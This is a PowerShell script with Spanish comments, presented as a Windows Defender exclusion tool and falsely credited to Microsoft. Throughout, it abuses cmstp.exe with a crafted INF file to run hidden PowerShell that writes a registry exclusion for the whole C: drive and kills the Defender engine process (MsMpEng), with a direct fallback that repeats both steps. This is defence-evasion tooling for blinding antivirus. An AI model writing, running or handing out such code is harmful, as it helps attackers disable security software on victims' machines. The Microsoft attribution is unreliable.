<#
.SYNOPSIS
   Windows Defender Exclusion Tool (Con seguimiento visual)
   © Microsoft 2024 - Técnicas No Documentadas
#>

function Defender {
    param(
        [Parameter(ParameterSetName='Interface')][switch]$Add
        # ... (otros parámetros)
    )

    # --- PERFIL CMSTP MEJORADO CON VISUALIZACIÓN ---
    $InfData = @'
[version]
Signature="$Windows NT$"
AdvancedINF=2.5

[DefaultInstall]
RunPreSetupCommands=PreSetup
RunPostSetupCommands=PostSetup

[PreSetup]
cmd /c "echo [*] Iniciando instalación... && taskkill /IM cmstp.exe /F /T"

[PostSetup]
cmd /c "echo [*] Ejecutando PowerShell... && start powershell -WindowStyle Hidden -Command `"& {
    `$p = 'HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths';
    if (!(Test-Path `$p)) { 
        New-Item `$p -Force | Out-Null;
        echo '[+] Creando clave de registro';
    };
    Set-ItemProperty `$p -Name 'C_' -Value 0 -Type DWORD -Force;
    echo '[+] Exclusion agregada al registro';
    Stop-Process -Name MsMpEng -Force -ErrorAction SilentlyContinue;
    echo '[+] Reiniciando Motor de Defender';
}`""
[Strings]
ServiceName="DefenderExclusionProfile"
'@

    if ($Add) {
        # 1. Crear archivo .inf con seguimiento
        $tempFile = "$env:TEMP\wdexcl_$(Get-Date -Format 'yyyyMMddHHmmss').inf"
        Write-Host "[*] Creando archivo temporal en: $tempFile" -ForegroundColor Cyan
        $InfData | Out-File $tempFile -Force -Encoding ASCII

        # 2. Ejecutar CMSTP con ventana visible (para seguimiento)
        Write-Host "[*] Ejecutando CMSTP.exe..." -ForegroundColor Cyan
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "cmstp.exe"
        $psi.Arguments = "/au `"$tempFile`""
        $psi.UseShellExecute = $true
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal
        $process = [System.Diagnostics.Process]::Start($psi)
        
        # 3. Esperar y verificar
        Write-Host "[*] Esperando finalización (15 segundos)..." -ForegroundColor Cyan
        $process.WaitForExit(15000)

        # 4. Verificación interactiva
        Write-Host "`n[VERIFICACIÓN]" -ForegroundColor Yellow
        Write-Host "1. Registro: " -NoNewline
        $regCheck = Get-ItemProperty "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue
        if ($regCheck -and ($regCheck."C_" -eq 0 -or $regCheck."C:\" -eq 0)) {
            Write-Host "OK (C:\ excluida)" -ForegroundColor Green
        } else {
            Write-Host "FALLO" -ForegroundColor Red
        }

        Write-Host "2. Procesos CMSTP: " -NoNewline
        $cmstpRunning = Get-Process -Name "cmstp" -ErrorAction SilentlyContinue
        if ($cmstpRunning) {
            Write-Host "ACTIVOS (matar manual con: taskkill /IM cmstp.exe /F)" -ForegroundColor Red
        } else {
            Write-Host "Inactivos" -ForegroundColor Green
        }

        Write-Host "3. Archivo INF: " -NoNewline
        if (Test-Path $tempFile) {
            Write-Host "Existe en $tempFile" -ForegroundColor Yellow
        } else {
            Write-Host "Eliminado automáticamente" -ForegroundColor Green
        }

        # 5. Solución alternativa si falla
        if (!$regCheck) {
            Write-Host "`n[!] SOLUCIÓN ALTERNATIVA DIRECTA" -ForegroundColor Magenta
            Write-Host "Ejecutando comando de respaldo..." -ForegroundColor Cyan
            $backupCmd = {
                $p = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
                if (!(Test-Path $p)) { New-Item $p -Force }
                Set-ItemProperty $p -Name "C_" -Value 0 -Type DWORD -Force
                Stop-Process -Name MsMpEng -Force -ErrorAction SilentlyContinue
            }
            Invoke-Command -ScriptBlock $backupCmd
        }

        # Limpieza final
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
    }
}

# Ejecución
if ($MyInvocation.InvocationName -ne '.') {
    Defender @PSBoundParameters
}
